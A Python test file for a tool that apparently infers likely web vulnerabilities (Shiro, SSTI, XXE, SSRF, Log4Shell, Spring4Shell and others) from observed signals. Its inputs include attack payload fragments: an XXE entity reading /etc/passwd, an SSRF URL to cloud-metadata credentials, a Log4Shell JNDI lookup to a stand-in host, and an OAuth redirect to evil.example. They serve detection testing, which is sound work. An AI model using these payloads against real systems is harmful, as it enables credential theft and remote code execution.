from utils.vuln_hypotheses import infer_vulnerability_hypotheses, summarize_hypotheses


def test_infer_shiro_cve_2016_4437_from_first_principles_signals():
    hypotheses = infer_vulnerability_hypotheses(
        observations=[
            "Apache Shiro Quickstart",
            "Set-Cookie: rememberMe=deleteMe; Path=/",
            "login.jsp includes a Remember Me checkbox",
        ]
    )
    assert hypotheses
    assert hypotheses[0].key == "hypothesis:shiro-cve_2016_4437"
    assert hypotheses[0].confidence >= 0.9


def test_summarize_hypotheses_mentions_next_step():
    hypotheses = infer_vulnerability_hypotheses(
        observations=[
            "Apache Shiro Quickstart",
            "Set-Cookie: rememberMe=deleteMe; Path=/",
        ]
    )
    summary = summarize_hypotheses(hypotheses)
    assert "Top vulnerability hypotheses:" in summary
    assert "Next:" in summary


def test_infer_ssti_hypothesis():
    hypotheses = infer_vulnerability_hypotheses(
        observations=["TemplateSyntaxError", "render_template_string(user_input)", "{{7*7}} -> 49"]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:ssti" in keys


def test_infer_file_upload_hypothesis():
    hypotheses = infer_vulnerability_hypotheses(
        observations=["Content-Type: multipart/form-data", 'filename="shell.jsp"', "Saved to /uploads/2026/"]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:file-upload" in keys


def test_infer_xxe_hypothesis():
    hypotheses = infer_vulnerability_hypotheses(
        observations=["application/xml", "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>"]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:xxe" in keys


def test_infer_ssrf_cloud_metadata_hypothesis():
    hypotheses = infer_vulnerability_hypotheses(
        observations=["Fetching http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:ssrf-cloud-metadata" in keys


def test_infer_graphql_and_idor_hypotheses():
    hypotheses = infer_vulnerability_hypotheses(
        observations=["POST /graphql", "__schema", "user_id=1001 returns 200, user_id=1002 also returns 200"]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:graphql-exposure" in keys
    assert "hypothesis:idor" in keys


def test_infer_jwt_and_oauth_hypotheses():
    hypotheses = infer_vulnerability_hypotheses(
        observations=["Authorization: Bearer eyJ...", "redirect_uri=https://evil.example/callback", "state=missing"]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:jwt" in keys
    assert "hypothesis:oauth-sso" in keys


def test_infer_framework_cve_hypotheses():
    hypotheses = infer_vulnerability_hypotheses(
        observations=[
            "Struts2 /login.action",
            "OGNL evaluation error",
            "com.alibaba.fastjson.JSONException",
            "${jndi:ldap://example/a}",
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
        ]
    )
    keys = {hypothesis.key for hypothesis in hypotheses}
    assert "hypothesis:struts2-rce" in keys
    assert "hypothesis:fastjson" in keys
    assert "hypothesis:log4shell" in keys
    assert "hypothesis:spring4shell" in keys
